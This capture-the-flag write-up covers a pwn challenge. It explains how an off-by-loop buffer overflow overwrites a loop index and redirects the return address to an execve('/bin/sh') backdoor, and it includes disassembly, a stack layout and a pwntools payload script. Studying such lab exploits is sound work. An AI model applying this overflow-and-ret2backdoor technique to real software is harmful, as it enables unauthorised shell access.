## Input Checker (100pt)

### Description

> Finding the best input.
> 
> `nc 35.186.153.116 5001`
> 
> Author: Tux

### Attachment

[input](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/IJCTF2020/pwn/input/input)

### Analysis

#### buffer overflow

```c
  for ( j = 0; j <= 1089; ++j ){
    chr = getchar();
    v7[j] = chr;
  }
```

>  do `getchar` 1089 times while `v7` is only 1008 bytes 

After the `for loop`, variables after `v7` will be overwritten.

#### back door

`execve("/bin/sh",0,0)` in `0x00401253`:

```nasm
0x00401253      ba00000000     mov edx, 0
0x00401258      be00000000     mov esi, 0
0x0040125d      488d3dae0d00.  lea rdi, str.bin_sh         ; 0x402012 ; "/bin/sh"
0x00401264      e837feffff     call sym.imp.execve
```

### Solution

#### Stack layout

We should focus on the stack layout after `v7` :

```c
  unsigned int v3; // eax
  __int64 v4; // rax
  char fd; // [rsp+0h] [rbp-640h]
  char v7[1008]; // [rsp+210h] [rbp-430h]
  int rnd1; // [rsp+600h] [rbp-40h]
  int rnd2; // [rsp+604h] [rbp-3Ch]
  int rnd3; // [rsp+608h] [rbp-38h]
  int rnd4; // [rsp+60Ch] [rbp-34h]
  int rnd5; // [rsp+610h] [rbp-30h]
  int chr; // [rsp+61Ch] [rbp-24h]
  __int64 const_4; // [rsp+620h] [rbp-20h]
  int j; // [rsp+628h] [rbp-18h]
  int i; // [rsp+62Ch] [rbp-14h]
```

in gdb:

![](http://image.taqini.space/img/20200427013321.png)

`j` is the **index** of `v7` as well as the variable controlling the `for loop` 

We can overwrite 1 byte of `j` after 1048 times `getchar`

```c
  for ( j = 0; j <= 1089; ++j ){
    chr = getchar();
    v7[j] = chr;
  }
```

Here is the stack layout while j is 1048: 

![](http://image.taqini.space/img/20200427015128.png)

We can overwrite the last byte of `j` to `0x37` ,so that `j` become `0x438` after `j++`

> `v7[0x438]` is the address of the return address

#### ret2backdoor

In the next 8 times `getchar`, return address in stack will be overwritten with address of backdoor:

```python
offset = 1048
payload = cyclic(offset)
payload += '\x37'
payload += p64(0x0401253) # backdoor
payload = payload.ljust(0x441,'A')
# debug('b *0x40129e')
sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/IJCTF2020/pwn/input) 


